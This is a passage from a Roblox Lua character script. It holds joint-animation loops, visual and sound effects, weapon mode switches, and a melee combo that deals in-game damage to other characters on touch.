		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
					end
									for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
									end
				WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = LeftHole2.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = LeftHole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
	
					for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
					end
									for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
									end
				WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = LeftHole2.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = LeftHole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
	
					for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
					end
		local POS = RootPart.Position
		ApplyAoE(POS, 20, true)
		WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	    CreateSound(649634100, Torso, 10, 1)
		CreateSound(201858072, Torso, 10, 1)
		CreateSound(1396758921, Torso, 10, 1)
		WACKYEFFECT({EffectType = "Wave", Size = VT(8,8,8), Size2 = VT(20,20,20), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	ATTACK = false
	Rooted = false
end


function Switch2()
	ATTACK = true
	Rooted = true
	if MODE == "Insan" then
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		RightArmGrasp.Part0 = Torso
		RightArmGrasp.C0 = CF(1.1,-1.1,0) * ANGLES(RAD(0), RAD(-90), RAD(-90))
		LeftArmGraps2.Part0 = RightArm
		LeftArmGraps2.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(0), RAD(0))			
		LeftArmGraps.Part0 = LeftArm
		LeftArmGraps.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
        sick.SoundId = "rbxassetid://924339757"
sick.TimePosition = 1
		MODE = "Insan3"
	elseif MODE == "Insan3" then
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		LeftArmGraps2.Part0 = Torso
		LeftArmGraps2.C0 = CF(1.2,0.2,0.1) * ANGLES(RAD(90), RAD(-50), RAD(-150))
		LeftArmGraps.Part0 = Torso
		LeftArmGraps.C0 = CF(-1.2,0.2,0.1) * ANGLES(RAD(90), RAD(50), RAD(150))
		RightArmGrasp.Part0 = RightArm
		RightArmGrasp.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
sick.SoundId = "rbxassetid://1138145518"
sick.TimePosition = 0
		MODE = "Insan"
	end
	ATTACK = false
	Rooted = false
end

function Switch1()
	ATTACK = true
	Rooted = true
	if MODE == "Insan" then
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		RightArmGrasp2.Part0 = LeftArm
		RightArmGrasp2.C0 = CF(0,-1, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
        sick.SoundId = "rbxassetid://1252073277"
sick.TimePosition = 1
		MODE = "Insan2"
	elseif MODE == "Insan2" then
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		RightArmGrasp2.Part0 = Torso
		RightArmGrasp2.C0 = CF(-1.1,-1.1,0) * ANGLES(RAD(0), RAD(90), RAD(-90))
sick.SoundId = "rbxassetid://1138145518"
sick.TimePosition = 0
		MODE = "Insan"
	end
	ATTACK = false
	Rooted = false
end

function Switch5()
	ATTACK = true
	Rooted = true
	if MODE == "Insan" then
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		RightArmGrasp2.Part0 = LeftArm
		RightArmGrasp2.C0 = CF(0,-1, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
		LeftArmGraps2.Part0 = Torso
		LeftArmGraps2.C0 = CF(3,0, 0.5) * ANGLES(RAD(180), RAD(0), RAD(0))			
		LeftArmGraps.Part0 = Torso
		LeftArmGraps.C0 = CF(-3,0, 0.5) * ANGLES(RAD(180), RAD(0), RAD(0)) 
       sick.SoundId = "rbxassetid://1275251078"
sick.TimePosition = 1
		MODE = "Insan5"
	elseif MODE == "Insan5" then
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		LeftArmGraps2.Part0 = Torso
		LeftArmGraps2.C0 = CF(1.2,0.2,0.1) * ANGLES(RAD(90), RAD(-50), RAD(-150))
		LeftArmGraps.Part0 = Torso
		LeftArmGraps.C0 = CF(-1.2,0.2,0.1) * ANGLES(RAD(90), RAD(50), RAD(150))
		RightArmGrasp.Part0 = RightArm
		RightArmGrasp.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
		RightArmGrasp2.Part0 = Torso
		RightArmGrasp2.C0 = CF(-1.1,-1.1,0) * ANGLES(RAD(0), RAD(90), RAD(-90))
sick.SoundId = "rbxassetid://1138145518"
sick.TimePosition = 0
		MODE = "Insan"
	end
	ATTACK = false
	Rooted = false
end

function PurgeCombo()
	ATTACK = true
	Rooted = false
	EQUIPPED = true
	local HIT2 = function()
		local HITS2 = {}
		local TOUCH2 = LeftArm.Touched:Connect(function(hit)
			if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
				local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
				local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
				if TORSO and HUM.Health > 0 then
					local PASS = true
					for i = 1, #HITS2 do
						if HITS2[i] == hit.Parent then
							PASS = false
						end
					end
					table.insert(HITS2,hit.Parent)
						if PASS == true then
						ManualDamage(HUM,MRANDOM(5,10),HUM.Torso)
					end
				end
			end
		end)
		return TOUCH2
	end
	local HIT = function()
		local HITS = {}
		local TOUCH = RightLeg.Touched:Connect(function(hit)
			if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
				local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
				local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
				if TORSO and HUM.Health > 0 then
					local PASS = true
					for i = 1, #HITS do
						if HITS[i] == hit.Parent then
							PASS = false
						end
					end
					table.insert(HITS,hit.Parent)
						if PASS == true then
						ManualDamage(HUM,MRANDOM(10,15),HUM.Torso)
					end
				end
			end
		end)
		return TOUCH
	end
	local HIT3 = function()
		local HITS3 = {}
		local TOUCH3 = LeftLeg.Touched:Connect(function(hit)
			if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
				local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
				local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
				if TORSO and HUM.Health > 0 then
					local PASS = true
					for i = 1, #HITS3 do
						if HITS3[i] == hit.Parent then
							PASS = false
						end
					end
					table.insert(HITS3,hit.Parent)
						if PASS == true then
						ManualDamage(HUM,MRANDOM(15,20),HUM.Torso)
					end
				end
			end
		end)
		return TOUCH3
	end
	if COMBO == 1 then
		for i=0, 0.35, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(15), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(-25)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(15), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		CreateSound(1489705211,RightLeg,MRANDOM(7,8),MRANDOM(8,13)/12,false)
		local TOUCHED = HIT()
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(-20), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(85)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(-20), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		TOUCHED:Disconnect()
		COMBO = 2
	elseif COMBO == 2 then
		for i=0, 0.35, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(15)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		CreateSound(1489705211,LeftArm,MRANDOM(7,8),MRANDOM(8,13)/12,false)
		local TOUCHED = HIT2()
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-55)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.5) * ANGLES(RAD(0), RAD(0), RAD(-105)) * ANGLES(RAD(90), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		TOUCHED:Disconnect()
		COMBO = 3
	elseif COMBO == 3 then
		for i=0, 0.2, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.5) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(75), RAD(0), RAD(-45)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -0.5, -0.25) * ANGLES(RAD(-5), RAD(70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.5, -0.25) * ANGLES(RAD(-5), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		CreateSound(1489705211,LeftLeg,MRANDOM(7,8),MRANDOM(8,13)/12,false)
		local TOUCHED = HIT3()
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0.5) * ANGLES(RAD(-40), RAD(0), RAD(0)), 0.85 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(75), RAD(0), RAD(-45)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0.05) * ANGLES(RAD(-30), RAD(70), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, -0.2) * ANGLES(RAD(60), RAD(-83), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		TOUCHED:Disconnect()
		COMBO = 4
	elseif COMBO == 4 then
		Rooted = false
				for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(30), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(60), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(90), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
